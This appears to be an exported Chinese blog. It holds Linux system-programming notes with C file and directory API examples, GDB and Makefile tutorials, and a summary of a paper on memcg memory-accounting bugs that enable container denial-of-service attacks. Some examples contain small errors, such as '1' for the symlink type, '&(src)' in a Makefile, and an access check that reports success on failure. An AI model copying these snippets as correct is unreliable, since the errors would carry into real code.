123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#include&lt;stdio.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;unistd.h&gt;#include&lt;pwd.h&gt;#include&lt;grp.h&gt;#include&lt;time.h&gt;#include&lt;string.h&gt;int main(int argc, char* argv[])&#123; // if (argc &lt; 2) &#123; printf(&quot;%s filename\\n&quot;, argv[0]); return -1; &#125; //通过stat函数获取用户传入的文件的信息 struct stat st; int ret = stat(argv[1], &amp;st); if (ret == -1) &#123; perror(&quot;stat&quot;); return -1; &#125; //获取文件类型和文件权限 char perms[11] = &#123; 0 &#125;;//用于保存文件类型和文件权限的字符串 switch (st.st_mode&amp;__S_IFMT) &#123; case __S_IFLNK: perms[0] = &#x27;1&#x27;; break; case __S_IFDIR: perms[0] = &#x27;d&#x27;; break; case __S_IFREG: perms[0] = &#x27;-&#x27;; break; case __S_IFBLK: perms[0] = &#x27;b&#x27;; break; case __S_IFCHR: perms[0] = &#x27;c&#x27;; break; case __S_IFSOCK: perms[0] = &#x27;s&#x27;; break; case __S_IFIFO: perms[0] = &#x27;p&#x27;; break; default: perms[0] = &#x27;?&#x27;; break; &#125; //判断文件的访问权限 //文件所有者 perms[1] = (st.st_mode &amp; S_IRUSR) ? &#x27;r&#x27; : &#x27;-&#x27;; perms[2] = (st.st_mode &amp; S_IWUSR) ? &#x27;w&#x27; : &#x27;-&#x27;; perms[3] = (st.st_mode &amp; S_IXUSR) ? &#x27;x&#x27; : &#x27;-&#x27;; //文件所在组 perms[4] = (st.st_mode &amp; S_IRGRP) ? &#x27;r&#x27; : &#x27;-&#x27;; perms[5] = (st.st_mode &amp; S_IWGRP) ? &#x27;w&#x27; : &#x27;-&#x27;; perms[6] = (st.st_mode &amp; S_IXGRP) ? &#x27;x&#x27; : &#x27;-&#x27;; //其他人 perms[7] = (st.st_mode &amp; S_IROTH) ? &#x27;r&#x27; : &#x27;-&#x27;; perms[8] = (st.st_mode &amp; S_IWOTH) ? &#x27;w&#x27; : &#x27;-&#x27;; perms[9] = (st.st_mode &amp; S_IXOTH) ? &#x27;x&#x27; : &#x27;-&#x27;; //硬链接数 int LinkNum = st.st_nlink; //文件所有者 char* fileuser = getpwuid(st.st_uid)-&gt;pw_name; //文件所在组 char* filegrp = getgrgid(st.st_gid)-&gt;gr_name; //文件大小 long int filesize = st.st_size; //获取修改的时间 char* time = ctime(&amp;st.st_mtime); char mtime[512] = &#123; 0 &#125;; strncpy(mtime, time, strlen(time) - 1); char buf[1024]; sprintf(buf, &quot;%s %d %s %s %ld %s %s&quot;, perms, LinkNum, fileuser, filegrp, filesize, mtime, argv[1]); printf(&quot;%s\\n&quot;, buf); return 0;&#125;Num, fileuser, filegrp, filesize, time, argv[1]); printf(&quot;%s\\n&quot;, buf); return 0;&#125; 运行结果如下： 文件属性操作函数access函数1234567#include&lt;unistd.h&gt;int access(const char* pathname, int mode);//作用：判断某个文件是否有某个权限，或者判断文件是否存在//参数//- pathname：判断文件路径//- mode：R_OK是否有读权限，W_OK是否有写权限，X_OK是否有执行权限，F_OK判断文件是否存在//返回值：成功返回0，失败返回-1 例子：判断文件权限123456789101112#include&lt;unistd.h&gt;#include&lt;stdio.h&gt;int main()&#123; int ret = access(&quot;a.txt&quot;, F_OK); if (ret == -1) &#123; perror(&quot;access&quot;); &#125; printf(&quot;文件存在\\n&quot;);&#125; 运行结果为： chmod函数1234567#include&lt;sys/stat.h&gt;int chmod(const char* pathname, mode_t mode);//修改文件的权限//参数//- pathname：需要修改的文件的路径//- mode：需要修改的权限值，八进制数//返回值：成功返回0，失败返回-1 例子：修改文件权限123456789101112#include&lt;sys/stat.h&gt;#include&lt;stdio.h&gt;int main()&#123; int ret = chmod(&quot;a.txt&quot;, 0775); if (ret == -1) &#123; perror(&quot;chmod&quot;); return -1; &#125; return 0;&#125; chown函数1int chown(const char *pathname, uid_t owner, gid_t group); truncate函数12345678#include&lt;unistd.h&gt;#include&lt;sys/types.h&gt;int truncate(const char* path, off_t length);//作用：缩减或扩展文件的尺寸至指定的大小//参数：//- path：需要修改的文件路径//- length：需要最终文件变成的大小//返回值：成功返回0，失败返回-1 例子12345678910111213#include&lt;unistd.h&gt;#include&lt;sys/types.h&gt;#include&lt;stdio.h&gt;int main()&#123; int ret = truncate(&quot;a.txt&quot;, 20); if (ret == -1) &#123; perror(&quot;truncate&quot;); return -1; &#125; return 0;&#125; 目录操作函数mkdir函数12345678#include&lt;sys/stat.h&gt;#include&lt;sys/types.h&gt;int mkdir(const char* pathname, mode_t mode);//作用：创建一个目录//参数//- pathname：创建的目录的路径//- mode：权限，八进制的数//返回值：失败返回-1，成功返回0 例子：创建一个名为aaa的目录 12345678910111213#include&lt;sys/stat.h&gt;#include&lt;sys/types.h&gt;#include&lt;stdio.h&gt;int main()&#123; int ret = mkdir(&quot;aaa&quot;, 0777); if (ret == -1) &#123; perror(&quot;mkdir&quot;); return -1; &#125; return 0;&#125; rmdir函数1int rmdir(const char* pathname); rename函数1int rename(const char* oldpath,const char* newpath); 例子：修改目录aaa为bbb 1234567891011#include&lt;stdio.h&gt;int main()&#123; int ret = rename(&quot;aaa&quot;, &quot;bbb&quot;); if (ret == -1) &#123; perror(&quot;rename&quot;); return -1; &#125; return 0;&#125; chdir函数，getcwd函数1234567891011#include&lt;unistd.h&gt;int chdir(const char* path);//作用：修改进程的工作目录//参数：//- path：需要修改的工作目录char* getcwd(char* buf, size_t size);//作用：获取当前工作目录//参数：//- buf：存储的路径，指向的是一个数组//- size：数组的大小//返回值：返回指向的一块内存，这个数据就是第一个参数 例子：修改当前工作目录 12345678910111213141516171819202122232425262728293031323334#include&lt;unistd.h&gt;#include&lt;stdio.h&gt;#include&lt;sys/stat.h&gt;#include&lt;sys/types.h&gt;#include&lt;fcntl.h&gt;int main()&#123; //获取当前的工作目录 char buf[128]; getcwd(buf, sizeof(buf)); printf(&quot;当前的工作目录是：%s\\n&quot;, buf); //修改工作目录 int ret = chdir(&quot;/home/plucky/Linux/lecture14/bbb&quot;); if (ret == -1) &#123; perror(&quot;chdir&quot;); return -1; &#125; //创建一个新的文件 int fd = open(&quot;chdir.txt&quot;, O_CREAT | O_RDWR, 0664); if (fd == -1) &#123; perror(&quot;open&quot;); return -1; &#125; close(fd); //获取当前的工作目录 char buf1[128]; getcwd(buf1, sizeof(buf1)); printf(&quot;当前的工作目录是：%s\\n&quot;, buf1); return 0;&#125; 目录遍历函数1234567891011121314#include&lt;sys/types.h&gt;#include&lt;dirent.h&gt;DIR* opendir(const char* name);//功能：打开一个目录//参数：//- name：需要打开的目录的名称//返回值：DIR* 类型，理解为目录流，错误返回NULLstruct dirent* readdir(DIR* dirp);//功能：读取目录中的数据//参数：//- dirp：opendir返回的结果//返回值：struct dirent*，代表读取到的文件的信息。读取到了文件末尾或者失败了返回NULLint closedir(DIR* dirp);//功能：关闭目录 例子：计算文件夹中普通文件的个数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include&lt;sys/types.h&gt;#include&lt;dirent.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;int getFileNum(const char* path);//读取某个目录下所有普通文件的个数int main(int argc, char* argv[])&#123; if (argc &lt; 2) &#123; printf(&quot;%s path\\n&quot;, argv[0]); return -1; &#125; int num = getFileNum(argv[1]); printf(&quot;普通文件的个数为：%d\\n&quot;, num); return 0;&#125;//用于读取目录下所有普通文件的个数int getFileNum(const char* path)&#123; //1、打开目录 DIR* dir = opendir(path); if (dir == NULL) &#123; perror(&quot;opendir&quot;); exit(0); &#125; //记录普通文件的个数 int total = 0; struct dirent* ptr; while ((ptr = readdir(dir)) != NULL) &#123; //获取名称 char* dname = ptr-&gt;d_name; //忽略掉. 和.. if (strcmp(dname, &quot;.&quot;) == 0 || strcmp(dname, &quot;..&quot;) == 0) &#123; continue; &#125; //判断是否是普通文件还是目录 if (ptr-&gt;d_type == DT_DIR) &#123; //目录，需要继续读取这个目录 char newpath[256]; sprintf(newpath, &quot;%s/%s&quot;, path, dname); total += getFileNum(newpath); &#125; if (ptr-&gt;d_type == DT_REG) &#123; //普通文件 total++; &#125; &#125; //关闭目录 closedir(dir); return total;&#125; 运行结果为： dup、dup2函数dup函数12345#include&lt;unistd.h&gt;int dup(int oldfd);//作用：复制一个新的文件描述符//fd=3，int fd1=dup（fd），两个文件描述符指向同一个文件//从空闲的文件描述符中找一个最小的，作为新的拷贝的文件描述符 例子：创建文件a.txt并且用dup复制的文件描述符修改a.txt 123456789101112131415161718192021222324252627#include&lt;unistd.h&gt;#include&lt;stdio.h&gt;#include&lt;fcntl.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;string.h&gt;int main()&#123; int fd = open(&quot;a.txt&quot;, O_RDWR | O_CREAT, 0664); int fd1 = dup(fd); if (fd1 == -1) &#123; perror(&quot;dup&quot;); return -1; &#125; printf(&quot;fd : %d , fd1 : %d\\n&quot;, fd, fd1); close(fd); char* str = &quot;hello,world&quot;; int ret = write(fd1, str, strlen(str)); if (ret == -1) &#123; perror(&quot;write&quot;); return -1; &#125; close(fd1); return 0;&#125; dup2函数1234567#include&lt;unistd.h&gt;int dup2(int oldfd, int newfd);//作用：重定向文件描述符//oldfd指向a.txt,newfd指向b.txt//调用函数成功后：newfd和b.txt做close，newfd指向了a.txt//oldfd必须是一个有效的文件描述符//oldfd和newfd值相同相当于什么都没有做 例子： 1234567891011121314151617181920212223242526272829303132333435363738#include&lt;unistd.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;sys/stat.h&gt;#include&lt;sys/types.h&gt;#include&lt;fcntl.h&gt;int main()&#123; int fd = open(&quot;1.txt&quot;, O_RDWR | O_CREAT, 0664); if (fd == -1) &#123; perror(&quot;open&quot;); return -1; &#125; int fd1 = open(&quot;2.txt&quot;, O_RDWR | O_CREAT, 0664); if (fd1 == -1) &#123; perror(&quot;open&quot;); return -1; &#125; printf(&quot;fd: %d,fd1: fd1: %d\\n&quot;, fd, fd1); int fd2 = dup2(fd, fd1); if (fd2 == -1) &#123; perror(&quot;dup2&quot;); return -1; &#125; //通过fd1去写数据，实际操作的是1.txt，而不是2.txt char* str = &quot;Hello,dup2&quot;; int len = write(fd1, str, strlen(str)); if (len == -1) &#123; perror(&quot;write&quot;); return -1; &#125; printf(&quot;fd: %d,fd1: %d,fd2: %d\\n&quot;, fd, fd1, fd2);&#125; fcntl函数123456789101112131415161718#include&lt;unistd.h&gt;#include&lt;fcntl.h&gt;int fcntl(int fd, int cmd, ... /*argv*/);//参数//- fd：表示需要操作的文件描述符//- cmd：表示对文件描述符进行如何操作// F_DUPFD复制文件描述符，复制的是第一个参数fd，得到一个新的文件描述符// int ret = fcntl(fd,F_DUPFD);//// F_GETFL获取指定的文件描述符文件状态flag// 获取的flag和我们通过open函数传递的flag是一个东西//// F_SETFL：设置文件描述符文件状态flag// 必选项：O_RDONLY,O_WRONLY,O_RDWR不可以被修改// 可选项：O_APPEND,NONBLOCK// O_APPEND表示追加数据// NONBLOCK设置成非阻塞// 阻塞和非阻塞：描述的是函数调用的行为。 例子： 12345678910111213141516171819202122232425262728#include&lt;unistd.h&gt;#include&lt;fcntl.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; // 复制文件描述符 // int fd = open(&quot;1.txt&quot;, O_RDONLY); // int ret = fcntl(fd, F_DUPFD); //修改或者获取文件状态flag int fd = open(&quot;1.txt&quot;, O_RDWR); if (fd == -1) &#123; perror(&quot;open&quot;); return -1; &#125; //获取文件描述符的状态flag int flag = fcntl(fd, F_GETFL); flag |= O_APPEND; //修改文件描述符状态的flag，给flag加入O_APPEND标记 int ret = fcntl(fd, F_SETFL, flag); char* str = &quot;hi&quot;; write(fd, str, strlen(str)); close(fd);&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"Linux系统编程","slug":"编程语言/C/Linux系统编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"}],"tags":[]},{"title":"C++ 学习 Linux系统编程 GDB调试","slug":"C++-学习-Linux系统编程-GDB调试","date":"2023-04-25T00:02:33.000Z","updated":"2023-05-14T07:16:09.632Z","comments":true,"path":"2023/04/25/C++-学习-Linux系统编程-GDB调试/","link":"","permalink":"http://example.com/2023/04/25/C++-%E5%AD%A6%E4%B9%A0-Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-GDB%E8%B0%83%E8%AF%95/","excerpt":"什么是GDBGDB是由GUN软件系统社区提供的调试工具，同GCC配套组成了一套完整的开发环境，GDB是Linux和许多类Unix系统中的标准开发环境 一般来说，GDB主要帮助你完成下面四个方面的功能：","text":"什么是GDBGDB是由GUN软件系统社区提供的调试工具，同GCC配套组成了一套完整的开发环境，GDB是Linux和许多类Unix系统中的标准开发环境 一般来说，GDB主要帮助你完成下面四个方面的功能： 1、启动程序，可以按照自定义的要求随心所欲的运行程序 2、可让被调试的程序在所指定的调置的断点处停住（断点可以是条件表达式） 3、当程序被停住时，可以检查此时程序中所发生的事 4、可以改变程序，将一个BUG产生的影响修正从而测试其他的BUG 准备工作通常在为调试而编译时，我们会关掉编译器的优化选项（-o），并打开调试选项（-g）。另外，-Wall在尽量不影响程序的情况下选项打开所有warning，也可以发现许多问题，避免一些不必要的BUG。 1gcc -g -Wall program.c -o program -g选项的作用是在可执行文件中加入源代码的信息，比如可执行文件中第几条机器指令对应源代码的第几行，但并不是把整个源文件嵌入到可执行文件中，所以在调试时必须保证gdb能找到源文件。 GDB命令 1gcc test.c -o test -g 之后运行如下命令 1gdb test 命令 启动和退出 1gdb 1quit 给程序设置参数&#x2F;获取设置参数 1set args 10 20 1show args GDB使用帮助 1help 查看当前文件代码 从默认位置显示 从指定的行显示 从指定函数显示 123list/llist/l 行号list/l 函数名 查看非当前文件代码 12list/l 文件名：行号list/l 文件名：函数名 设置显示的行数 12show list/listsizeset list/listsize 行数 设置断点 1234b/break 行号b/break 函数名b/break 文件名：行号b/break 文件名：函数 查看断点 1info/i break/b 删除断点 1d/del/delte 断点编号 设置断点无效 1dis/disable 断点编号 设置断点生效 1ena/enable 断点编号 设置断点条件（一般用在循环的位置） 1b/break 10 if i==5 GDB命令-调试命令 运行GDB程序 12start(程序停在第一行)run(遇到断点才停) 继续运行，到下一个断点停 1c/continue 向下执行一行代码 1n/next 变量操作 12p/print 变量名(打印变量值)ptype 变量名(打印变量类型) 向下单步调试（遇到函数进入函数体） 12s/stepfinish(跳出函数体) 自动变量操作 123display num(自动打印指定变量的值)i/info displayundisplay 编号 其他操作 12set var 变量名 = 变量值until (跳出循环) next和step的区别 next是一步步往下运行代码，不会进入函数体中中 自动设置变量例子","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"Linux系统编程","slug":"编程语言/C/Linux系统编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"C++ 学习 Linux系统编程 Makefile","slug":"C++-学习-Linux系统编程-Makefile","date":"2023-04-24T05:30:29.000Z","updated":"2023-12-15T06:56:40.297Z","comments":true,"path":"2023/04/24/C++-学习-Linux系统编程-Makefile/","link":"","permalink":"http://example.com/2023/04/24/C++-%E5%AD%A6%E4%B9%A0-Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-Makefile/","excerpt":"什么是Makefile一个工程中源文件不计其数，其按类型、功能、模块分别放在若干个目录中，Makefile文件定义了一系列的规则来指定哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作，因为Makefile文件就像一个Shell脚本一样，也可以执行操作系统的命令。 Makefile带来的好处就是“自动化编译”，一旦写好，只需要一个make命令，整个工程完全自动编译，极大的提高了软件开发效率。make是一个命令工具，是一个工程完全编译，极大的提高了软件开发的效率。make是一个命令工具，是一个解释Makefile文件中指令的命令工具，一般来说，大多数的IDE都有这个命令，比如Delphi的make，Visual C++的make，Linux下GUN的make","text":"什么是Makefile一个工程中源文件不计其数，其按类型、功能、模块分别放在若干个目录中，Makefile文件定义了一系列的规则来指定哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作，因为Makefile文件就像一个Shell脚本一样，也可以执行操作系统的命令。 Makefile带来的好处就是“自动化编译”，一旦写好，只需要一个make命令，整个工程完全自动编译，极大的提高了软件开发效率。make是一个命令工具，是一个工程完全编译，极大的提高了软件开发的效率。make是一个命令工具，是一个解释Makefile文件中指令的命令工具，一般来说，大多数的IDE都有这个命令，比如Delphi的make，Visual C++的make，Linux下GUN的make Makefile文件命名和规则 文件命名 makefile或者Makefile Makefile规则 一个Makefile文件中可以有一个或多个规则 目标 …: 依赖 … 命令（shell命令） … 目标：最终要生成的文件（伪目标除外） 依赖：生成目标文件所需要的文件或是目标 命令：通过执行命令对依赖操作生成目标（命令前必须Tab缩进） 例子我们现在有文件： 编辑Makefile文件 12app:sub.c add.c mult.c div.c main.c gcc sub.c add.c mult.c div.c main.c -o app 运行结果如下： Makefile的工作原理 命令在执行之前，需要先检查规则中的依赖是否存在 如果存在，执行命令 如果不存在，向下检查其它的规则，检查有没有一个规则是用来生成这个依赖的，如果找到了，则执行该规则中的命令 检测更新，在执行规则中的命令时，会比较目标和依赖文件的时间 如果依赖的时间比目标的时间晚，需要重新生成目标 如果依赖的时间比目标的时间早，目标不需要更新，对应规则中的命令不需要被执行 我们修改Makefile文件内容为： 1234567891011121314app:sub.o add.o mult.o div.o main.o gcc sub.o add.o mult.o div.o main.o -o appsub.o:sub.c gcc -c sub.c -o sub.oadd.o:add.c gcc -c add.c -o add.odiv.o:div.c gcc -c div.c -o div.omain.o:main.c gcc -c main.c -o main.o 我们输入命令make 变量 自定义变量 变量名 &#x3D; 变量值 var &#x3D; hello 预定义变量 AR：归档维护程序的名称，默认值为ar CC：C编译器的名称，默认值为cc CXX：C++编译器的名称，默认值为g++ $@：目标的完整名称 $&lt;：第一个依赖文件的名称 $^：所有的依赖文件 获取变量的值 $(变量名) 12app:main.c a.c b.c gcc -c main.c a.c b.c 12app:main.c a.c b.c $(CC) -c $^ -o $@ 上两段代码等价 1%.o:%.o % 为通配符，匹配一个字符串 两个%匹配的是同一个字符串 我们上述的Makefile文件也可改为 1234567src = sub.o add.o mult.o div.o main.otarget = app$(target):$(src) $(CC) &amp;(src) -o $(target)%.o:%.c $(CC) -c $&lt; -o $@ 函数$(wildcard PATTERN …) 功能：获取指定目录下指定类型的文件列表 参数：PATTERN指的是某个或多个目录下的对应的某种类型的文件，如果有多个目录，一般使用空格间隔 返回：得到的若干个文件的文件列表，文件名之间使用空格间隔 示例： 1$(wildcard *.c ./sub/*c) 返回值格式：a.c b.c c.c d.c e.c f.c $(patsubst &lt;pattern&gt;,&lt;replacement&gt;,&lt;text&gt;) 功能：查找中的单词（单词以“空格”、“Tab”或“回车”“换行”分隔）是否符合模式,如果匹配的话，则以替换。 可以包括通配符%,表示任意长度的字符串。如果中也包含%，那么，中的这个%将是中的那个%所代表的字符串。（可以用\\来转义，以\\%来表示真实含义的%字符） 返回：函数返回被替换过后的字符串 示例 1$(patsubst %.c, %.o, x.c bar.c) 返回值格式：x.o bar.o 1234567891011src=$(wildcard ./*.c)objs=$(patsubst %.c, %.o, $(src))target=app$(target):$(objs) $(CC) $(objs) -o $(target)%.o:%.c $(CC) -c $&lt; -o $@clean: rm $(objs) -f 之后运行 1make clean 就会自动删除rm指令","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"Linux系统编程","slug":"编程语言/C/Linux系统编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"Makefile","slug":"Makefile","permalink":"http://example.com/tags/Makefile/"}]},{"title":"论文阅读 Making Memory Account Accountable：Analyzing and Detecting Memory Missing account bugs for Container Platforms","slug":"论文阅读-Making-Memory-Account-Accountable：Analyzing-and-Detecting-Memory-Missing-account-bugs-for-Container-Platforms","date":"2023-04-23T11:09:13.000Z","updated":"2023-05-03T10:12:16.789Z","comments":true,"path":"2023/04/23/论文阅读-Making-Memory-Account-Accountable：Analyzing-and-Detecting-Memory-Missing-account-bugs-for-Container-Platforms/","link":"","permalink":"http://example.com/2023/04/23/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-Making-Memory-Account-Accountable%EF%BC%9AAnalyzing-and-Detecting-Memory-Missing-account-bugs-for-Container-Platforms/","excerpt":"摘要 Linux内核引入了memory control group(memcg)，用于在进程级对内存的使用进行记录和限制。memcg由于其灵活性和高效性，被容器平台广泛采用，成为一种基础技术。虽然内存记帐很重要，但由于内存记帐接口的多样性和大量的分配&#x2F;空闲路径，它很容易出现记账的错误。据我们所知，目前还没有针对内存帐户丢失问题的系统分析，包括其安全影响、检测等。 在本文中，我们首次系统地研究了内存记账缺失问题。我们首先对其在容器平台上的可利用性和安全性影响进行了深入分析。然后我们开发了一个名为MANTA(Memory Accounting Analyzer)的工具，它结合了静态和动态分析技术来自动检测和验证内存丢失帐户错误。","text":"摘要 Linux内核引入了memory control group(memcg)，用于在进程级对内存的使用进行记录和限制。memcg由于其灵活性和高效性，被容器平台广泛采用，成为一种基础技术。虽然内存记帐很重要，但由于内存记帐接口的多样性和大量的分配&#x2F;空闲路径，它很容易出现记账的错误。据我们所知，目前还没有针对内存帐户丢失问题的系统分析，包括其安全影响、检测等。 在本文中，我们首次系统地研究了内存记账缺失问题。我们首先对其在容器平台上的可利用性和安全性影响进行了深入分析。然后我们开发了一个名为MANTA(Memory Accounting Analyzer)的工具，它结合了静态和动态分析技术来自动检测和验证内存丢失帐户错误。 我们的分析表明，所有的容器运行时，包括runC和Kata容器，都容易受到基于内存记账缺失的攻击。此外，内存记账缺失可以被利用来攻击Docker、CaaS和FaaS平台，导致内存耗尽，从而使单个节点甚至整个集群崩溃。我们的工具报告了53个可利用的内存记账缺失漏洞，其中37个被内核开发者确认，并提交了相应的补丁，还有两个新的CVE被分配。通过深入分析、自动检测、报告的错误和提交的补丁，我们相信我们的研究提高了容器平台内存核算的正确性和安全性。 CCS CONCEPTS Security and privacy → Operating systems security; Virtualization and security KEYWORDS Cloud infrastructure, Linux kernel, memory accounting, missingaccount, DoS attack INTRODUCTION计算和限制内存使用是每个操作系统内核的核心功能。特别是，Linux内核引入了内存控制组(memcg)，它可以在进程级别解释和限制内存使用。因此，与基于虚拟机(VM)的内存分区技术相比，memcg具有更细粒度和轻量级的特点。 由于其灵活性和高效性，memcg已经被容器平台广泛采用。众所周知，容器平台严重依赖资源共享来提高硬件资源的利用率。而memcg为容器在进程级别提供了唯一的内存使用记录和限制方法。因此，诸如Docker 、容器即服务平台（例如，OpenShift）和函数即服务平台（例如，OpenWhisk）等流行的容器平台，都采用memcg来控制其容器的内存使用。此外，基于虚拟机的容器运行时——Kata容器 也使用memcg来限制主机上的容器线程和其他服务线程的内存。此外，开放容器倡议（OCI）认证要求容器运行时必须使用memcg才能获得认证 。因此，memcg已经成为容器平台和云计算的基础技术。 不幸的是，尽管memcg被广泛使用，但由于其复杂性，它容易出错。具体来说，Linux内核选择将内存记账接口插入到内存分配&#x2F;释放路径中以实现记账，这可能由于高度复杂的内存使用和大量与内存使用相关的接口和代码路径，容易引入内存记账丢失错误（分配的内存未计入账户）。此外，即使记账接口位置正确，它们的记账行为也是有条件的，并受到记账标志的控制，我们发现这些标志经常缺失。因此，我们发现内存记账丢失错误很常见。 然而，即使memcg已经被广泛使用，其内存记账丢失漏洞从未得到系统分析。 memcg的现状是由两个原因造成的。首先，从来没有清楚地知道内存记账丢失漏洞会产生什么安全影响或者它们是否可利用。结果，记账丢失错误被内核开发人员忽略，并且没有特别努力消除这些问题。其次，没有自动检测内存记账丢失漏洞。正如之前讨论的那样，内存记帐设计和实现非常复杂，并深度集成到Linux kernel的复杂内存管理子系统中。因此，即使对于有经验的用户来说也很难正确理解记帐设计和策略。例如，我们发现Docker官方网站错误地声称“页面高速缓存的记忆费用在控制组之间分配”，并且“当一个cgroup终止时，它可能会增加另一个cgroup 的内存使用量“。因此，在没有自动检测的情况下手动推断记帐正确性几乎是不可能的更糟糕的是, 内存记账丢失是否可检测以及如何进行检测仍然是开放性问题。 本文首次对Linux内存记账丢失错误进行了系统分析和检测。我们首先进行了深入分析，以了解内存记账丢失错误在容器平台上的可利用性和安全影响。然后我们开发了一个名为MANTA（Memory AccouNTing Analyzer的简称）的工具，它结合了静态和动态分析技术来自动检测内存记账丢失错误。我们的分析显示，不仅普通容器运行时（如runC），而且安全容器运行时（如Kata容器）都容易受到由内存记账丢失错误引起的内存耗尽攻击。更糟糕的是，内存记账丢失错误可以被利用来攻击Docker、CaaS和FaaS平台，导致容器节点甚至整个集群崩溃。 由于memcg的复杂性，内存记账丢失检测面临两个挑战。首先，没有文档或现有研究定义了memcg使用的内存记账接口。现有的工作采用自然语言处理或包装函数分析来识别内存分配接口。然而，由于不匹配的启发式规则，这些技术无法直接应用于记账接口。为解决这个问题，MANTA提出了基于计数器的接口识别方法，自动检测所有与内存记账相关的接口。关键的观察是，所有内存记账接口最终都会在实现中增加&#x2F;减少相应的页面计数器。识别从页面计数器修改开始，迭代整个调用图以精确识别记账接口。 其次，分析内存分配和内存记账之间的映射具有挑战性。这种分析由于从内存分配位置到内存记账位置的深层和嵌套执行路径而变得复杂。它还需要跟踪分配的页面和计入账户的页面之间的数据流，以获得正确的别名集。此外，由于条件标志的控制，记账可能是有条件的。因此，MANTA提出了分配-消耗映射分析和记账标志分析来解决这个挑战。此外，为了验证检测到的内存记账丢失错误，MANTA进一步使用Linux测试项目来检查它们的可触发性和影响。 通过MANTA，我们检测并报告了memcg中的53个可利用错误，其中37个已经被内核开发人员确认并有已合并或待合并的补丁。报告的错误获得了两个新的CVE（一个正在等待）。总之，这项工作进行了深入调查，不仅分析了可利用性和影响，还系统地检测了内存记账丢失错误。我们相信，这些发现将有助于内核memcg开发人员在未来改进内存记账。本文做出了以下贡献。 In-depth analysis of exploitability and impacts 我们设计了新的攻击来利用容器平台上的内存记账问题。我们的攻击表明，内存记账丢失漏洞可以很容易地被利用来攻击正常和安全的容器运行时(即runC和Kata容器)和流行的容器平台(即Docker, OpenShift和OpenWhisk)，导致容器节点甚至整个集群崩溃。 Automated detection with new techniques 我们提出了多种分析技术来有效地检测内存记账丢失错误，集成了静态分析和动态验证。我们实现了基于LLVM的检测，并使用Linux内存记账对其进行评估。我们进一步使用Linux Test Project (LTP)来验证检测到的错误的可触发性。 Community impact 我们在Linux v5.10中检测并报告了53个可利用的内存记账丢失错误，其中37个已被内核开发人员确认。分配了两个新的cve(一个正在等待)。我们的发现提高了内核社区对记账丢失的影响的认识，他们还邀请我们测试他们的下游内核。我们计划开源我们的检测工具，以进一步帮助社区提高内存计费的正确性和安全性。 道德考虑：本文中的所有实验和攻击都是在一台专用的物理机器上进行的，这台机器仅由我们使用。我们负责任地向Linux内核开发人员披露了所有检测到的错误，并为所有经确认的错误提交了补丁。此外，我们还向Docker团队报告了关于内存记账的错误声明。 BACKGROUDLinux Memory Accounting内存记帐是每个现代操作系统内核的核心功能。目前Linux内核采用内存控制组(memory control group, memcg)来实现内存计费。Memcg包含4种类型的内存:user、kernel、swap，and socket。 user 记录所有用户空间内存页 kernel 记录内核空间内存页和对象 swap 记录交换区页面 socket 记录socket内存 Memcg仅对用户空间进程的内存进行记账，并跳过对内核守护程序或内部内存使用的记账。需要注意的是，Linux内核v5.9引入了对象cgroup，它会对子页面内核内存使用（如内核对象）进行记账。对象cgroup可以将对象分配到不同的cgroups中，从而消除每个memcg的slab（内存分配池），节省大量的slab内存。 Accounting：Linux内核针对不同类型的内存使用不同的记账接口。具体来说，Linux内核使用mem_cgroup_charge对用户和交换内存进行记账，使用__memcg_kmem_charge对内核内存进行记账。对于内核内存，Linux内核还要求在内存分配过程中设置__GFP_ACCOUNT标志以对内核页面进行记账。用户可以通过文件接口与memcg进行交互。例如，用户可以从memory.usage_in_bytes检查总内存使用情况。 一个memcg实例可能包含多个内存使用情况在其中进行记账的进程。memcg以树形层次结构组织，因此父节点上的内存限制也会影响所有子节点。memcg有两个版本：v1和v2。它们的主要区别在于层次结构和用户接口，而在记账方面的实现大致相同。目前两者都在使用。本文提到的是cgroups v1，大多数结论也适用于cgroups v2。 